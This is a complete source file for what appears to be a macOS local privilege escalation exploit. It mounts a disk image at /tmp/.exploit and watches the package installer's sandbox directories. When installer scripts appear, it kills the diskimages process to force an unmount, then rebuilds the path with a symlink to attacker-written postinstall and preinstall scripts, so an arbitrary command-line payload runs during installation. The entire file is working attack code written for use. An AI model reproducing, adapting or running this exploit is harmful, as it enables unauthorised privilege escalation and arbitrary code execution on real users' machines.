#import <Foundation/Foundation.h>
#include <sys/stat.h>
#include <dirent.h>

#define MOUNT_DIR "/tmp/.exploit"
#define PAYLOAD_DIR MOUNT_DIR"/payload"
#define PAYLOAD_POST PAYLOAD_DIR"/postinstall"
#define PAYLOAD_PRE PAYLOAD_DIR"/preinstall"

int diskimages_pid = 0;

void prepare(const char *payload) {
    printf("[*] preparing the payload...\n");
    mkdir(MOUNT_DIR, 0777);
    mkdir(PAYLOAD_DIR, 0777);
    
    FILE *fp = fopen(PAYLOAD_POST, "w");
    fwrite("#!/bin/sh\n", 10, 1, fp);
    fwrite(payload, strlen(payload), 1, fp);
    fclose(fp);
    chmod(PAYLOAD_POST, 0777);
    
    fp = fopen(PAYLOAD_PRE, "w");
    fwrite("#!/bin/sh\n", 10, 1, fp);
    fwrite("echo 'place holder'", 19, 1, fp);
    fclose(fp);
    chmod(PAYLOAD_PRE, 0777);
    
    printf("[*] preparing the dmg mounting...\n");
    system("hdiutil create -size 50m -volname .exploit -ov disk.dmg");
    system("hdiutil attach disk.dmg -mountpoint "MOUNT_DIR);
    
    char line[64];
    FILE *cmd = popen("pgrep diskimages", "r");
    fgets(line, 64, cmd);
    diskimages_pid = (int)strtoul(line, NULL, 10);
    pclose(cmd);
    printf("[*] got diskimages pid:%s[%d].\n", line, diskimages_pid);
    printf("[*] all the preparations are done.\n");
}

void cleanup(void) {
    unlink("disk.dmg");
    system("rm -rf "MOUNT_DIR);
}

// the payload scripts will be executed in the path like:
// $MOUNT_DIR/.PKInstallSandboxManager-SystemSoftware/2C3F8603-0D00-4AF2-9F4D-BE51119859F8.activeSandbox/OpenPath.ZTCpSY/Scripts/com.apple.pkg.macOSPublicBetaAccessUtility.16U2035.Z15tB7/postinstall

void fire_the_hole(void) {
    DIR *dp = NULL;
    struct dirent *ep = NULL;
    char *sandbox = NULL, *openpath = NULL, *pkgid = NULL;
    char path[MAXPATHLEN] = {0};
    
    while (1) {
        dp = opendir(MOUNT_DIR"/.PKInstallSandboxManager-SystemSoftware");
        if (NULL == dp) continue;
        while ((ep = readdir (dp))) {
            if (strlen(ep->d_name) == 0x32) { //strlen("2C3F8603-0D00-4AF2-9F4D-BE51119859F8.activeSandbox")==0x32
                sandbox = ep->d_name;
                printf("[*] Got Sandbox:%s.\n", sandbox);
                goto NEXT1;
            }
        }
        closedir (dp);
    }
NEXT1:
    snprintf(path, MAXPATHLEN, MOUNT_DIR"/.PKInstallSandboxManager-SystemSoftware/%s", sandbox);
    while (1) {
        dp = opendir(path);
        if (NULL == dp) continue;
        while ((ep = readdir (dp))) {
            if (strlen(ep->d_name) == 15) { //strlen("OpenPath.ZTCpSY")==15
                openpath = ep->d_name;
                printf("[*] Got OpenPath:%s.\n", openpath);
                goto NEXT2;
            }
        }
        closedir (dp);
    }
NEXT2:
    snprintf(path, MAXPATHLEN, MOUNT_DIR"/.PKInstallSandboxManager-SystemSoftware/%s/%s/Scripts", sandbox, openpath);
    while (1) {
        dp = opendir(path);
        if (NULL == dp) continue;
        while ((ep = readdir (dp))) {
            if (strlen(ep->d_name) > 8) { // length > 8, like: "pkgid.version_id.XXXXXX"
                pkgid = ep->d_name;
                printf("[*] Got pkgid:%s.\n", pkgid);
                goto NEXT3;
            }
        }
        closedir (dp);
    }
NEXT3:
    snprintf(path, MAXPATHLEN, MOUNT_DIR"/.PKInstallSandboxManager-SystemSoftware/%s/%s/Scripts/%s/postinstall", sandbox, openpath, pkgid);
    while (-1 == access(path, R_OK)) {
        printf("[!] failed to access: %s, errno:%d, waiting...\n", path, errno);
    }
    // time to unmount the dmg
    //system("hdiutil detach "MOUNT_DIR);
    // use the kill signal to eject the dmg immediately(accidently)
    kill(diskimages_pid, 9);
    // wait and make sure the dmg is unmounted
    while (1) {
        dp = opendir(MOUNT_DIR"/.PKInstallSandboxManager-SystemSoftware");
        if (NULL == dp) break;
        closedir (dp);
    }
    
    printf("[*] re-creating the scripts path and put our payload inside.\n");
    mkdir(MOUNT_DIR"/.PKInstallSandboxManager-SystemSoftware", 0777);
    snprintf(path, MAXPATHLEN, MOUNT_DIR"/.PKInstallSandboxManager-SystemSoftware/%s", sandbox);
    mkdir(path, 0777);
    snprintf(path, MAXPATHLEN, MOUNT_DIR"/.PKInstallSandboxManager-SystemSoftware/%s/%s", sandbox, openpath);
    mkdir(path, 0777);
    snprintf(path, MAXPATHLEN, MOUNT_DIR"/.PKInstallSandboxManager-SystemSoftware/%s/%s/Scripts", sandbox, openpath);
    mkdir(path, 0777);
    snprintf(path, MAXPATHLEN, MOUNT_DIR"/.PKInstallSandboxManager-SystemSoftware/%s/%s/Scripts/%s", sandbox, openpath, pkgid);
    symlink(PAYLOAD_DIR, path);
    
    printf("[*] exploit successfully :D\n");
}

int main(int argc, const char * argv[]) {
    if (argc != 2) {
        printf("Usage: %s any_payload_command_string\n", argv[0]);
    }
    
    prepare(argv[1]);
    fire_the_hole();
//    sleep(10);// wait for our payload being executed, then cleanup the mess
//    cleanup();
    
    return 0;
}
